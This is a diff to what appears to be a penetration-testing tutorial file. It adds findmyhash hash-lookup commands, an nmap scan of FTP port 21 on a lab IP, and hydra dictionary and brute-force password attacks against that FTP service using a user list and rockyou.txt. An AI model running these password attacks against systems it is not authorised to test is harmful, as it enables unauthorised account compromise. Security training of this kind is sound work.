@@ -42,6 +42,44 @@ Enter the sample hash value
 Press CTRL + C to exit
 
 
+# findmyhash 
+
+# findmyhash SHA1 -h <hash_value>
+# findmyhash MD5 -h <hash_value>
+
+Password Cracking
+=================
+
+Hydra
+-----
+
+# hydra
+
+Example, Password attack to ftp service 
+
+# nmap 192.168.10.20 -p 21
+
+# cat > user_lists.org
+admin
+ftp
+root
+eric
+bob
+
+# hydra -L user_lists.org -P /usr/share/wordlists/rockyou.txt 192.168.10.20 ftp
+
+# hydra -x -h
+
+# hydra -l root -x 4:6:a 192.168.10.20 ftp
+
+-- Minimum number of characters 4 and maximum number of characters 6 and small alphanumeric 
+
+John the Ripper
+===============
+
+
+
+
 
 
 
